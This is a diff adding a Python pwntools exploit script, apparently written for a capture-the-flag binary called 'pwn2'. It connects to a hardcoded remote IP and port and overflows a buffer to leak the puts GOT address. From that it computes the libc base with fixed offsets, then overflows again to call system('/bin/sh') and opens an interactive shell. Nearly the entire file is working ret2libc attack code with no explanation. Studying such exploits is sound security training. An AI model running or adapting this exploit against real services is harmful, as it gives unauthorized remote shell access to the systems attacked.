@@ -1,0 +1,39 @@
+#!/usr/bin/python
+#coding=utf-8
+from PwnContext import *
+from IPython import embed as ipy
+
+context.terminal = ['gnome-terminal','-x','sh','-c']
+context.log_level = 'debug'、
+
+s      = lambda data               :p.send(data) 
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r      = lambda numb=4096          :p.recv(numb)
+rl      = lambda                    :p.recvline()
+ru      = lambda delims,drop=False  :p.recvuntil(delims,drop)
+uu32    = lambda data               :u32(data.ljust(4, '\x00'))
+uu64    = lambda data               :u64(data.ljust(8, '\x00'))
+info    = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
+irt     = lambda                    :p.interactive()
+
+context.binary = './pwn2'
+elf = ELF('./pwn2')
+puts = elf.plt['puts']
+puts_got = elf.got['puts']
+p = remote('219.219.61.234','10001')
+# p = process('./pwn2')
+# gdb.attach(p)
+p.send('\x00'+'a'*6+p32(111111)+p32(0))
+
+payload = 'a'*0x6c+'a'*4+p32(puts)+p32(0x08048753)+p32(puts_got)
+sa('dom_haha\n',payload)
+libc = uu32(ru('\xf7'))-0x0005f150
+print hex(libc)
+system = libc+0x0003a950
+bin_sh = libc+0x15910b 
+# # gdb.attach(p,"b *0x080486D1")
+
+s('a'*0x6c+'a'*4+p32(system)+'a'*4+p32(bin_sh))
+irt()
